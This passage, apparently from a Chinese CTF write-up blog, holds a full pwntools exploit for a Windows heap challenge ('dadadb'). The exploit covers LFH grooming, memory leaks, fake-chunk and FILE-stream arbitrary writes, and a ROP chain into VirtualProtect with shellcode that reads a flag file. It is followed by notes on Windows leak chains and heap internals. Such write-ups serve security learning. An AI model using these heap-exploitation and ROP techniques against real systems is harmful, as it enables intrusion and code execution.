class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">host = <span class="string">"10.211.55.24"</span></span><br><span class="line">port = <span class="number">6677</span></span><br><span class="line">host = <span class="string">"13.230.51.176"</span></span><br><span class="line">port = <span class="number">4869</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span>    </span><br><span class="line">r = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(user,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(user)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(key,size,data)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.send(key)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(key)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.send(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(key)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.send(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="string">"ddaa"</span>,<span class="string">"phdphd"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Enable LFH</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">19</span>):</span><br><span class="line">    add(<span class="string">"lays"</span> + str(i),<span class="number">0x90</span>,<span class="string">"fuck"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Fill UserBlock</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10</span>): </span><br><span class="line">    add(<span class="string">"dada"</span> + str(i),<span class="number">0x90</span>,<span class="string">"ggwp"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leave a hole</span></span><br><span class="line">free(<span class="string">"dada15"</span>)</span><br><span class="line"><span class="comment">#Fill the hole with structure</span></span><br><span class="line">add(<span class="string">"dada14"</span>,<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x70</span>) <span class="comment">#leak heap ptr</span></span><br><span class="line">view(<span class="string">"dada14"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"a"</span>*<span class="number">0x70</span>)</span><br><span class="line">heap =u64(r.recv(<span class="number">8</span>)) &amp; <span class="number">0xffffffffffff0000</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap:"</span>,hex(heap)</span><br><span class="line"><span class="keyword">if</span> heap == <span class="number">0</span> :</span><br><span class="line">    exit();</span><br><span class="line">r.recvuntil(p64(<span class="number">0x90</span>))</span><br><span class="line">ids = r.recvuntil(<span class="string">"\x00"</span>)[:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"leakid:"</span>,ids</span><br><span class="line"></span><br><span class="line"><span class="comment">#check heap with signature</span></span><br><span class="line">add(<span class="string">"dada14"</span>,<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x70</span> + p64(heap+<span class="number">0x10</span>)) </span><br><span class="line">view(ids)</span><br><span class="line">dump = r.recvuntil(<span class="string">"ddaa"</span>)</span><br><span class="line"><span class="keyword">if</span> p32(<span class="number">0xffeeffee</span>) <span class="keyword">not</span> <span class="keyword">in</span> dump:</span><br><span class="line">    view(ids)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readmem</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> ids</span><br><span class="line">    add(<span class="string">"dada14"</span>,<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x70</span> + p64(addr))</span><br><span class="line">    view(ids)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    <span class="keyword">return</span> u64(r.recvuntil(<span class="string">"ddaa"</span>)[:<span class="number">8</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">    </span><br><span class="line">lock = readmem(heap+<span class="number">0x2c0</span>)</span><br><span class="line">ntdll = lock - <span class="number">0x163cb0</span><span class="number">-0x20</span><span class="number">-0x40</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"ntdll:"</span>,hex(ntdll)</span><br><span class="line">pebldr = ntdll + <span class="number">0x1653a0</span></span><br><span class="line">immol = pebldr + <span class="number">0x20</span></span><br><span class="line">ldrdata = readmem(immol)</span><br><span class="line">bin_entry = readmem(ldrdata + <span class="number">0x28</span>)</span><br><span class="line">bin_base = bin_entry - <span class="number">0x1e54</span><span class="number">-0x1c</span><span class="number">-0x40</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"bin:"</span>,hex(bin_base)</span><br><span class="line">iat = bin_base + <span class="number">0x3000</span></span><br><span class="line">readfile = readmem(iat)</span><br><span class="line">kernel32 = readfile - <span class="number">0x22680</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"kernel32:"</span>,hex(kernel32)</span><br><span class="line">peb = readmem(ntdll+<span class="number">0x165308</span>) - <span class="number">0x80</span></span><br><span class="line">teb = peb + <span class="number">0x1000</span></span><br><span class="line">stack = readmem(teb+<span class="number">0x10</span>+<span class="number">1</span>) &lt;&lt; <span class="number">8</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack:"</span>,hex(stack)</span><br><span class="line">stack_end = stack + (<span class="number">0x10000</span> - (stack &amp; <span class="number">0xffff</span>))</span><br><span class="line">cookie = readmem(heap+<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"cookie:"</span>,hex(cookie)</span><br><span class="line">processparameter = readmem(peb+<span class="number">0x20</span>)</span><br><span class="line">hstdin = readmem(processparameter+<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"hstdin:"</span>,hex(hstdin)</span><br><span class="line">password = bin_base + <span class="number">0x5658</span></span><br><span class="line">start = stack_end - <span class="number">8</span></span><br><span class="line">ret = <span class="number">0</span></span><br><span class="line">ret_addr = bin_base+<span class="number">0x1b60</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x1000</span>/<span class="number">8</span>):</span><br><span class="line">    addr = start - <span class="number">8</span>*i</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    v = readmem(addr)</span><br><span class="line">    <span class="keyword">if</span> v == ret_addr :</span><br><span class="line">        ret = addr</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"found!"</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"ret:"</span>,hex(ret)</span><br><span class="line"><span class="keyword">if</span> ret == <span class="number">0</span> :</span><br><span class="line">    exit()</span><br><span class="line">add(<span class="string">"lucas"</span>,<span class="number">0x200</span>,<span class="string">"king"</span>)</span><br><span class="line">add(<span class="string">"lucas"</span>,<span class="number">0x100</span>,<span class="string">"ggwp"</span>)</span><br><span class="line">add(<span class="string">"david942j"</span>,<span class="number">0xf0</span>,<span class="string">"a"</span>*<span class="number">0x10</span>+<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="string">"mehqq"</span>,<span class="number">0xf0</span>,<span class="string">"qq"</span>)</span><br><span class="line">add(<span class="string">"mehqq2"</span>,<span class="number">0xf0</span>,<span class="string">"qq"</span>)</span><br><span class="line">add(<span class="string">"mehqq3"</span>,<span class="number">0xf0</span>,<span class="string">"qq"</span>)</span><br><span class="line">free(<span class="string">"mehqq2"</span>)</span><br><span class="line">free(<span class="string">"david942j"</span>)</span><br><span class="line">view(<span class="string">"lucas"</span>)</span><br><span class="line">dump = r.recvuntil(<span class="string">"b"</span>*<span class="number">8</span>)[:<span class="number">-8</span>]</span><br><span class="line">davidfd = u64(dump[<span class="number">-16</span>:<span class="number">-8</span>])</span><br><span class="line">davidbk = u64(dump[<span class="number">-8</span>:])</span><br><span class="line">header = u64(dump[<span class="number">-24</span>:<span class="number">-16</span>])</span><br><span class="line">david = davidfd - <span class="number">0x200</span></span><br><span class="line">fakechunk = p64(<span class="number">0</span>) +  p64(header) + p64(password) + p64(davidbk)</span><br><span class="line">logout()</span><br><span class="line"><span class="comment">#forge fake chunk in front of fp</span></span><br><span class="line">login(<span class="string">"ddaa"</span> + <span class="string">"\x00"</span>*<span class="number">4</span> + p64(header) + p64(<span class="number">0xdeadbeef</span>) + p64(password)[:<span class="number">-2</span>],<span class="string">"phdphd"</span> + <span class="string">"\x00"</span>*<span class="number">2</span> + p64(header) + p64(password<span class="number">-0x28</span>) + p64(david)[:<span class="number">-2</span>])</span><br><span class="line">add(<span class="string">"lucas"</span>,<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">0x100</span> + fakechunk)</span><br><span class="line">add(<span class="string">"yy"</span>,<span class="number">0xf0</span>,<span class="string">'g\n'</span>)</span><br><span class="line"></span><br><span class="line">fp = password + <span class="number">0x20</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">_ptr = <span class="number">0</span></span><br><span class="line">_base = ret</span><br><span class="line">flag = <span class="number">0x2080</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bufsize = <span class="number">0x100</span>+<span class="number">0x10</span></span><br><span class="line">obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag) + p32(fd) + p32(<span class="number">0</span>) + p64(bufsize) +p64(<span class="number">0</span>)</span><br><span class="line">obj += p64(<span class="number">0xffffffffffffffff</span>) + p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">add(<span class="string">"hh"</span>,<span class="number">0xf0</span>,<span class="string">'a'</span>*<span class="number">16</span> + p64(fp) + p64(<span class="number">0</span>) + obj) <span class="comment"># overwrite fp</span></span><br><span class="line">virtualprotect = kernel32 + <span class="number">0x1b680</span></span><br><span class="line">readfile = kernel32 + <span class="number">0x22680</span></span><br><span class="line">pop_rdx_rcx_r8_r9_r10_r11 = ntdll + <span class="number">0x8fb30</span></span><br><span class="line">buf = bin_base + <span class="number">0x5800</span></span><br><span class="line">rop = flat([pop_rdx_rcx_r8_r9_r10_r11,buf,hstdin,<span class="number">0x300</span>,buf<span class="number">-8</span>,<span class="number">0</span>,<span class="number">0</span>,readfile])</span><br><span class="line">rop += flat([pop_rdx_rcx_r8_r9_r10_r11,<span class="number">0x1000</span>,bin_base+<span class="number">0x5000</span>,<span class="number">0x40</span>,buf<span class="number">-8</span>,<span class="number">0</span>,<span class="number">0</span>,virtualprotect,buf])</span><br><span class="line">logout()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use FILE stream exploit to do arbitrary writing</span></span><br><span class="line">login(<span class="string">'da'</span>,<span class="string">'da'</span>) <span class="comment"># trigger fread to do arbitrary writing</span></span><br><span class="line">r.send(rop.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)) <span class="comment"># overwrite return address with rop chain</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">processheap = peb+<span class="number">0x30</span></span><br><span class="line">heapcreate = kernel32 + <span class="number">0x1ec80</span></span><br><span class="line">ldrheap = ntdll+<span class="number">0x165400</span></span><br><span class="line">winexec = kernel32+<span class="number">0x5f090</span></span><br><span class="line">writefile = kernel32 + <span class="number">0x22770</span></span><br><span class="line">createfile = kernel32 + <span class="number">0x222f0</span></span><br><span class="line">getstdhandle = kernel32+<span class="number">0x1c890</span></span><br><span class="line">sc = asm(<span class="string">"""</span></span><br><span class="line"><span class="string">    xor rcx,rcx</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    xor r8,r8</span></span><br><span class="line"><span class="string">    xor r9,r9</span></span><br><span class="line"><span class="string">    xor rdi,rdi</span></span><br><span class="line"><span class="string">    mov cl,2</span></span><br><span class="line"><span class="string">    mov rdi,0x%x</span></span><br><span class="line"><span class="string">    call rdi</span></span><br><span class="line"><span class="string">    mov rdi,0x%x</span></span><br><span class="line"><span class="string">    mov qword ptr [rdi],rax</span></span><br><span class="line"><span class="string">    mov rdi,0x%x</span></span><br><span class="line"><span class="string">    mov qword ptr [rdi],rax</span></span><br><span class="line"><span class="string">    jmp flagx</span></span><br><span class="line"><span class="string">s :</span></span><br><span class="line"><span class="string">    pop r10</span></span><br><span class="line"><span class="string">createfile:</span></span><br><span class="line"><span class="string">    mov qword ptr [rsp+0x40],3</span></span><br><span class="line"><span class="string">    mov qword ptr [rsp+0x30],0</span></span><br><span class="line"><span class="string">    mov qword ptr [rsp+0x28],0</span></span><br><span class="line"><span class="string">    lea r12,qword ptr [rsp+0x40]</span></span><br><span class="line"><span class="string">    mov qword ptr [rsp+0x20],3</span></span><br><span class="line"><span class="string">    mov r8,1</span></span><br><span class="line"><span class="string">    xor r9,r9</span></span><br><span class="line"><span class="string">    mov rdx,0x80000000</span></span><br><span class="line"><span class="string">    mov rcx,r10</span></span><br><span class="line"><span class="string">    mov r11,0x%x</span></span><br><span class="line"><span class="string">    call r11</span></span><br><span class="line"><span class="string">readfile:</span></span><br><span class="line"><span class="string">    mov qword ptr [rsp+0x20],0</span></span><br><span class="line"><span class="string">    xor r9,r9</span></span><br><span class="line"><span class="string">    mov r8,0x80</span></span><br><span class="line"><span class="string">    mov rdx,0x%x</span></span><br><span class="line"><span class="string">    mov rcx,rax</span></span><br><span class="line"><span class="string">    mov r11,0x%x</span></span><br><span class="line"><span class="string">    call r11</span></span><br><span class="line"><span class="string">getstdhandle:</span></span><br><span class="line"><span class="string">    mov rcx,0xfffffff6</span></span><br><span class="line"><span class="string">    mov r11,0x%x</span></span><br><span class="line"><span class="string">    call r11</span></span><br><span class="line"><span class="string">writefile:</span></span><br><span class="line"><span class="string">    mov qword ptr [rsp+0x20],0</span></span><br><span class="line"><span class="string">    xor r9,r9</span></span><br><span class="line"><span class="string">    mov r8,0x80</span></span><br><span class="line"><span class="string">    mov rdx,0x%x</span></span><br><span class="line"><span class="string">    mov rcx,rax</span></span><br><span class="line"><span class="string">    mov r11,0x%x</span></span><br><span class="line"><span class="string">    call r11</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">    jmp loop</span></span><br><span class="line"><span class="string">flagx:</span></span><br><span class="line"><span class="string">    call s</span></span><br><span class="line"><span class="string">"""</span> % (heapcreate,processheap,ldrheap,createfile,buf+<span class="number">0x400</span>,readfile,getstdhandle,buf+<span class="number">0x400</span>,writefile))</span><br><span class="line">flagfile = <span class="string">"C:\\\\dadadb\\flag.txt"</span></span><br><span class="line">r.sendline(sc + flagfile + <span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="反思与收获："><a href="#反思与收获：" class="headerlink" title="反思与收获："></a>反思与收获：</h2><p>关于<code>shellcode</code>，出题人原话：</p>
<blockquote>
<p>After we have arbitrary memory writing we can overwrite return address on stack with ROP. But it disallow child process , you can not create new process.</p>
<ul>
<li>We need use ROP to read flag.txt, but it’s a little complicated.</li>
<li>So we use ROP to do VirtualProtect to change page permission so that we can jump to shellcode.</li>
</ul>
<p>After we can run shellcode, we can read files more easily.</p>
<ul>
<li>We use some function to read file<ul>
<li>Kernel32 (because we only provide <code>kernel32.dll</code> and <code>ntdll.dll</code> for challenger)<ul>
<li><code>CreateFile</code>/<code>ReadFile</code>/<code>GetStdHandle</code>/<code>WriteFile</code></li>
</ul>
</li>
<li>If it use default heap<ul>
<li>You should create new heap for windows API, otherwise you will encounter heap detection<ul>
<li>Overwrite <code>_PEB-&gt;ProcessHeap</code>/<code>ucrtbase!crtheap</code>/<code>ntdll!ldrpheap</code> with new heap.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<p>如果提供了<code>ucrtbase</code>，那么应该普通的<code>open/read/write</code>应该也是可以的。</p>
<p>如果是<code>default heap</code>的话，<code>shellcode</code>要复杂一点？但是我用栈的没区别吧。。。？</p>
<p>关于<code>VirtualProtect</code>：</p>
<blockquote>
<p>BOOL VirtualProtect(<br>  LPVOID lpAddress,<br>  DWORD dwSize,<br>  DWORD flNewProtect,<br>  PDWORD lpflOldProtect<br>);<br>各参数的意义为：</p>
<p><code>lpAddress</code>，要改变属性的内存起始地址。</p>
<p><code>dwSize</code>，要改变属性的内存区域大小。</p>
<p><code>flNewProtect</code>，内存新的属性类型，设置为PAGE_EXECUTE_READWRITE（0x40）时该内存页为可读可写可执行。</p>
<p><code>pflOldProtect</code>，内存原始属性类型保存地址。</p>
<p>修改内存属性成功时函数返回非0，修改失败时返回0。</p>
<p>如果我们能够按照如下参数布置好栈帧的话就可以将shellcode所在内存区域设置为可执行模式。</p>
<p>BOOL VirtualProtect(<br>   shellcode所在内存空间起始地址,<br>   shellcode大小,<br>   0x40,<br>   某个可写地址  </p>
</blockquote>
<hr>
<p>常见的泄露链：</p>
<ul>
<li>有<code>binbase</code>时：<ul>
<li>可用<code>IAT</code>表泄露<code>KERNEL32.dll</code>和<code>ucrtbase.dll</code>和<code>ntdll.dll</code></li>
<li>再用<code>ntdll.dll</code>泄露<code>PebLdr_addr</code>，利用<code>PebLdr_addr</code>泄露<code>Peb</code>，利用<code>Peb</code>泄露<code>Teb</code>，利用<code>Peb+0x30</code>泄露<code>_HEAP</code>，利用<code>Teb</code>泄露<code>stack_end</code>。</li>
</ul>
</li>
<li>有<code>_HEAP</code>时：<ul>
<li>可用<code>_HEAP_LOCK(_HEAP+0x2c0)</code>泄露<code>ntdll.dll</code></li>
<li>在上面第二条的基础上加上几条：利用<code>Peb+0x10</code>泄露<code>binbase</code>，利用<code>Peb+0x20</code>泄露<code>ProcessParameters</code>，有了<code>ProcessParameters</code>可泄露<code>StandardInput(offset=0x20)</code>，<code>StandardOutput(offset=0x28)</code>，<code>StandardError(offset=0x30)</code>。</li>
</ul>
</li>
</ul>
<p>其他：</p>
<p><code>CreateFile</code>，<code>ReadFile</code>，<code>GetStdHandle</code>，<code>WriteFile</code>这四个写<code>shellcode</code>必备函数都在<code>KERNEL32.dll</code>中，而<code>system</code>函数在<code>ucrtbase.dll</code>中。</p>
<p>当遇到<code>default heap</code>时，采用<code>LFH</code>来<code>defeat random</code>是个好方法。而且<code>LFH</code>较为稳定且检测较少，在后端分配器时，每次<code>free</code>一个<code>chunk</code>时，都会对<code>next_chunk</code>的头部进行检测，我们必须伪造<code>header</code>，但是<code>LFH</code>却没有，所以操作起来方便很多。</p>
<p><code>Windows</code>平台下的函数可能会出现下溢的情况，也就是<code>underflow</code>，需要防止这种情况出现，<code>rop</code>之前要先抬栈。</p>
<p>windows x64平台<code>fastcall</code>调用约定的主要特性如下：</p>
<ul>
<li>前四个整型或指针类型参数由<code>RCX</code>,<code>RDX</code>,<code>R8</code>,<code>R9</code>依次传递，前四个浮点类型参数由<code>XMM0</code>,<code>XMM1</code>,<code>XMM2</code>,<code>XMM3</code>依次传递。</li>
<li>调用函数为前四个参数在调用栈上保留相应的空间，称作shadow space或spill slot。即使被调用方没有或小于4个参数，调用函数仍然保留那么多的栈空间，这有助于在某些特殊情况下简化调用约定。</li>
<li>除前四个参数以外的任何其他参数通过栈来传递，从右至左依次入栈。</li>
<li>由调用函数负责清理调用栈。</li>
<li>小于等于64位的整型或指针类型返回值由RAX传递。</li>
<li>浮点返回值由<code>XMM0</code>传递。</li>
<li>更大的返回值(比如结构体)，由调用方在栈上分配空间，并有RCX持有该空间的指针并传递给被调用函数，因此整型参数使用的寄存器依次右移一格，实际只可以利用3个寄存器，其余参数入栈。函数调用结束后，RAX返回该空间的指针。</li>
<li>除<code>RCX</code>,<code>RDX</code>,<code>R8</code>,<code>R9</code>以外，<code>RAX</code>、<code>R10</code>、<code>R11</code>、<code>XMM4</code> 和 <code>XMM5</code>也是易变化的(volatile)寄存器。</li>
<li><code>RBX</code>,<code>RBP</code>, <code>RDI</code>, <code>RSI</code>, <code>R12</code>, <code>R14</code>, <code>R14</code>, and <code>R15</code>寄存器则必须在使用时进行保护。</li>
<li>在寄存器中，所有参数都是右对齐的。小于64位的参数并不进行高位零扩展，也就是高位是无法预测的垃圾数据。</li>
</ul>
<hr>
<p><code>GetStdHandle</code>的三种参数的数值：</p>
<p><code>STD_ERROR_HANDLE</code>: <code>0xfffffff4</code></p>
<p><code>STD_OUTPUT_HANDLE</code>：<code>0xfffffff5</code></p>
<p><code>STD_INPUT_HANDLE</code>：<code>0xfffffff6</code></p>
<h1 id="2019WCTF-LazyFragmentationHeap"><a href="#2019WCTF-LazyFragmentationHeap" class="headerlink" title="2019WCTF_LazyFragmentationHeap"></a>2019WCTF_LazyFragmentationHeap</h1><p>这题应该是目前来看遇到的最复杂的一题了(如果<code>dadadb</code>是在<code>Default Heap</code>上的话可能也会很复杂)，复现完以后感觉还是很多疑惑的地方。。。</p>
<p>遇到的问题与心得：</p>
<p><code>Default Heap</code>的情况较为复杂，与是否有<code>pdb</code>文件，源码文件等都有关，因为这些东西可能加载到<code>windbg</code>中会影响调试态堆块的布局，<strong>以及增大了某个size的堆块开启LFH的概率</strong>。因为我之前一直带着<code>pdb</code>调试，然后<code>windbg</code>里面看到的<code>0x60</code>这个<code>size</code>的chunk，早都开启了<code>LFH</code>，导致我没法覆写和伪造<code>fake_file</code>，后来删了<code>pdb</code>文件之后才可以正常进行。</p>
<p><code>unlink</code>可以在<code>malloc</code>中实现，也可以在<code>free</code>中实现。<code>windows</code>的<code>unlink</code>要比<code>linux</code>的简单许多，因为不需要构造假的<code>chunk</code>，只需要知道指针地址即可。</p>
<p><code>fake_Flink = &amp;target-8</code>，<code>fake_Blink = &amp;target</code></p>
<p><code>pioinfo_offset</code>实际上是每次都会随机化的，和堆的状态有关系，所以我们用一次单独的进程泄露<code>pioinfo_offset</code>传给下一次进程使用实际上是没有意义的。。。虽说是随机化，但是实际上值就那么几个，所以我们可以猜一个即可，大概两三次就可能撞上一次。我这里用的是<code>0x8740</code>，还有<code>0x83a0</code>出现的也比较频繁。</p>
<p>关于<code>shellcode</code>，因为在<code>CreateFile/open</code>时，会动态申请<code>chunk</code>出来作为<code>File</code>结构体，所以如果我们的堆已经损坏的话，这一步会报错(不禁感叹<code>linux</code>下<code>open</code>的幸运)，所以<code>shellcode</code>里我们需要用<code>HeapCreateStub</code>创建一个新堆，然后把进程的<code>ProcessHeap(Peb+0x300)</code>改成新堆的地址，之后又分两条路：</p>
<ol>
<li><code>KERNEL32</code>流派：需要将<code>ntdll!LdrpHeap</code>的值改为新堆的地址，然后调用<code>CreateFile/GetStdHandle/ReadFile/WriteFile</code>。</li>
<li><code>ucrtbase</code>流派：需要将<code>ucrtbase!_acrt_heap</code>的值改为新堆的地址，然后调用<code>open/_read/_write</code>。</li>
</ol>
<p><code>_HEAP</code>的<code>Encoding</code>每次都会随机化，且无法从<code>_HEAP</code>中读取，直接看<code>_HEAP+0x80</code>处的值是为空的，只能自己泄露<code>chunkheader</code>，然后自己伪造一个加密前的，然后异或回去。</p>
<p>关于泄露在<code>linux</code>和<code>windows</code>下的一些区别：</p>
<p><code>linux</code>的<code>topchunk</code>没有<code>mainarena</code>的地址，所以我们没法直接用<code>new,delete(与topchunk合并),new,show</code>来泄露，但是<code>windows</code>的<code>伪topchunk</code>，(实际上没有<code>topchunk</code>这一说，只是一个很大的chunk罢了)，的<code>FLink</code>与<code>BLink</code>是含有heap地址的，可以用<code>new,delete(与伪topchunk合并),new,show</code>来泄露<code>_HEPA</code>。</p>
<p><code>windows</code>下的伪随机化：<code>binbase</code>，各种<code>dllbase</code>都是系统重启才会随机化。还有很重要的一点就是很多重要数据结构的地址都是一层套一层的，所以当我们有了一个任意地址读的机会，我们就可以利用这个特点进行分段泄露。<strong>因为有时候得到一次任意读的机会需要很复杂的chunk构造</strong>，导致后面没法继续利用，分段泄露就可以使我们泄露出所有关键数据后再直接构造利用链。</p>
<p><code>windows</code>下的真随机化：<code>stack</code>，<code>heap</code>，<code>Peb</code>，<code>Teb</code>。这四个东西是每次程序启动都会随机化，所以他们无法用分段泄露的方法来泄露。只能一气喝成。</p>
<p><code>_HEAP</code>我觉得是<code>winpwn</code>中最重要的数据结构，里面含有很多重要数据，例如：<code>ntdll_base</code>，<code>bin_base</code>。</p>
<p>一般想后续利用的话，<code>binbase</code>是必须知道的，因为大部分情况泄露<code>KERNEL32</code>和<code>ucrtbase</code>都需要用<code>binbase</code>中的<code>IAT</code>表。而后续的<code>rop</code>又必须得用这两个库中的函数。</p>
<p>一般泄露流程为：泄露<code>_HEAP</code>，泄露<code>ntdll</code>，泄露<code>PebLdr</code></p>
<ul>
<li>有了<code>PebLdr</code>之后，就可以泄露<code>Peb</code>与<code>Teb</code>了，<code>Peb</code>中也有<code>binbase</code>。但是因为<code>Peb</code>是真随机化，所以没法分段泄露，所以用<code>_HEAP</code>泄露<code>binbase</code>更好。</li>
<li>在<code>PebLdr+0x20</code>处为<code>imoml( Ldr.InMemoryOrderModuleList)</code>，其指向<code>_HEAP</code>的某个地方，在这个地方<code>+0x28</code>处有<code>binbase</code>存在，我们可以获得其值然后与<code>0xffff</code>按位与得到其偏移，再分段泄露出<code>binbase</code>。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">     ULONG               Length;</span><br><span class="line">     BOOLEAN             Initialized;</span><br><span class="line">     PVOID               SsHandle;</span><br><span class="line">     LIST_ENTRY          InLoadOrderModuleList;</span><br><span class="line">     LIST_ENTRY          InMemoryOrderModuleList;</span><br><span class="line">     LIST_ENTRY          InInitializationOrderModuleList;</span><br><span class="line"> &#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">     LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">     LIST_ENTRY 